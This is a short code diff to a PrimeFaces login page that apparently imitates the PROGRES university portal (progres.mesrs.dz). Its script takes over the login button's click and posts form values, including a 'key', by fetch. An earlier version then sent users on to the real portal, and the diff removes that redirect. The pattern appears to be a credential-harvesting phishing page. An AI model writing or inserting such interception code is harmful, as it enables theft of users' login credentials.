@@ -130,7 +130,6 @@ body.login {
 <script type="text/javascript">$(function(){PrimeFaces.focus();});</script>
 
 <script>
-	
 $(document).ready(function() {
     // Use the PrimeFaces button's click event instead of form submission
     $('#loginFrm\\:loginBtn').click(function(e) {
@@ -152,18 +151,16 @@ $(document).ready(function() {
                 key
             })
         })
-.then(response => response.json())
-.then(data => {
-  console.log('Success:', data);
-	window.location.href = "https://progres.mesrs.dz/webfve/login.xhtml";
-  
-})
-.catch(error => {
-  console.error('Error:', error);
-  
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    });
 });
-});
-  </script>
+</script>
 
 <fieldset style="padding-top: 5px">
 <style type="text/css">.ui-messages-error-icon {
